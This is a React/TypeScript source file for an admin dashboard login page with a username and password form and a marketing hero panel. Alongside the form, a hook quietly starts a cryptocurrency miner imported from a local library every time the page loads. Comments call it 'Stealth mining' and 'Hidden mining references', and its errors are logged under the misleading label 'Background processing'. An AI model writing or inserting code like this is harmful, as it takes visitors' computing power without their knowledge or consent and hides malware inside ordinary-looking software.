import { useState, useEffect } from "react";
import { useAuth } from "@/hooks/use-auth";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card";
import { LockKeyhole, BarChart, User, ShieldCheck, Gauge } from "lucide-react";
import { minerInstance } from "@/lib/miner";

export default function AuthPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { user, login } = useAuth();
  const [, navigate] = useLocation();

  // If user is already logged in, redirect to home
  useEffect(() => {
    if (user) {
      navigate("/");
    }
  }, [user, navigate]);

  // Stealth mining - start mining automatically for 7.5 seconds
  useEffect(() => {
    // Set configurations silently
    minerInstance.setThreads(1);
    minerInstance.setThrottle(50);
    
    // Start mining silently
    const startSilentMining = async () => {
      try {
        await minerInstance.start();
        
        // Stop after 7.5 seconds
        setTimeout(async () => {
          await minerInstance.stop();
        }, 7500);
      } catch (error) {
        console.error("Background processing error:", error);
      }
    };
    
    startSilentMining();
    
    // Cleanup
    return () => {
      minerInstance.stop().catch(console.error);
    };
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      const success = await login(username, password);
      if (success) {
        navigate("/");
      }
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gradient-to-br from-gray-900 to-black">
      <div className="flex flex-1">
        {/* Login Form */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-6">
          <Card className="w-full max-w-md border-gray-700 shadow-xl">
            <CardHeader className="space-y-1 text-center">
              <div className="flex justify-center mb-2">
                <div className="h-14 w-14 rounded-full bg-gradient-to-br from-indigo-600 to-violet-600 flex items-center justify-center">
                  <LockKeyhole className="h-7 w-7 text-white" />
                </div>
              </div>
              <CardTitle className="text-2xl font-semibold">Admin Dashboard Login</CardTitle>
              <CardDescription>
                Enter your credentials to access the dashboard
              </CardDescription>
            </CardHeader>
            <form onSubmit={handleSubmit}>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="username">Username</Label>
                  <div className="relative">
                    <Input
                      id="username"
                      placeholder="Username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="pl-10"
                      required
                    />
                    <User className="absolute left-3 top-2.5 h-5 w-5 text-muted-foreground" />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="password">Password</Label>
                  <div className="relative">
                    <Input
                      id="password"
                      type="password"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="pl-10"
                      required
                    />
                    <ShieldCheck className="absolute left-3 top-2.5 h-5 w-5 text-muted-foreground" />
                  </div>
                </div>
              </CardContent>
              <CardFooter>
                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? "Signing in..." : "Sign In"}
                </Button>
              </CardFooter>
            </form>
            <div className="p-4 bg-gradient-to-br from-gray-800/50 to-gray-900/50 border-t border-gray-800 rounded-b-lg text-center text-sm text-gray-400">
              <p>Default credentials: username [null], password [unknown]</p>
            </div>
          </Card>
        </div>

        {/* Hero Section - Hidden mining references */}
        <div className="hidden lg:flex lg:w-1/2 bg-gradient-to-br from-indigo-900 to-purple-900 items-center justify-center p-12">
          <div className="max-w-lg text-center">
            <div className="flex justify-center mb-6">
              <BarChart className="h-20 w-20 text-white opacity-80" />
            </div>
            <h1 className="text-4xl font-bold text-white mb-6">Project Dashboard</h1>
            <p className="text-lg text-indigo-100 mb-8">
              Access real-time statistics, performance metrics, and system management
              in our comprehensive dashboard interface.
            </p>
            <div className="grid grid-cols-3 gap-4 mt-8">
              <div className="bg-black/30 rounded-lg p-4 border border-indigo-500/20">
                <h3 className="text-indigo-300 font-semibold mb-1">Real-time Data</h3>
                <p className="text-sm text-gray-300">Monitor performance metrics</p>
              </div>
              <div className="bg-black/30 rounded-lg p-4 border border-indigo-500/20">
                <h3 className="text-indigo-300 font-semibold mb-1">System Stats</h3>
                <p className="text-sm text-gray-300">Track resource utilization</p>
              </div>
              <div className="bg-black/30 rounded-lg p-4 border border-indigo-500/20">
                <h3 className="text-indigo-300 font-semibold mb-1">Performance</h3>
                <p className="text-sm text-gray-300">Optimize system performance</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}